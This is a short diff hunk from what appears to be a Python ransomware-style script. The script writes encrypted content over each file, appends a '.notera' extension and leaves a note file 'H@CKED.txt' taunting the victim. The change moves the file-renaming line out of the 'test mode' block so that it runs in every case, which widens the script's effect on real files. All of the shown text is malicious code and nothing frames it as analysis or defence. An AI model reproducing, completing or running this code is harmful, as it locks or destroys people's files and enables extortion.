@@ -45,7 +45,7 @@ for i in range(len(files)):
         # In test mode, just write the encrypted content directly
         with open(files[i], "wb") as file:
             file.write(encrypted_content)
-        os.rename(files[i], files[i] + ".notera")
+    os.rename(files[i], files[i] + ".notera")
 
 with open(os.path.join(DIR, "H@CKED.txt"), "w") as file:
     file.write("LOL. YOU'VE BEEN HACKED. YOU'RE AN IDIOT!!!")
